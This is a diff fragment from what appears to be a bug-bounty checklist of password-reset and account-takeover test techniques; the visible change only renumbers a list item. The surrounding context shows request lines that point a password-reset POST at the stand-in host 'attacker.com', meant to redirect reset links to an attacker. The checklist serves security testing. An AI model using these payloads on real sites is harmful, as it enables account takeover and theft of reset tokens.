@@ -21,7 +21,7 @@ https://medium.com/@deadoverflow/account-takeover-vulnerability-that-resulted-in
 9. Request for 2 password reset links and try the older one.
 9.1. (RTLO)[https://hackerone.com/reports/563268]
 9.2. (BYPASS)[https://hackerone.com/reports/271324]
-11. Try:
+10. Try:
 ```
 POST https://attacker.com/resetpassword.php HTTP/1.1
 POST @attacker.com/resetpassword.php HTTP/1.1
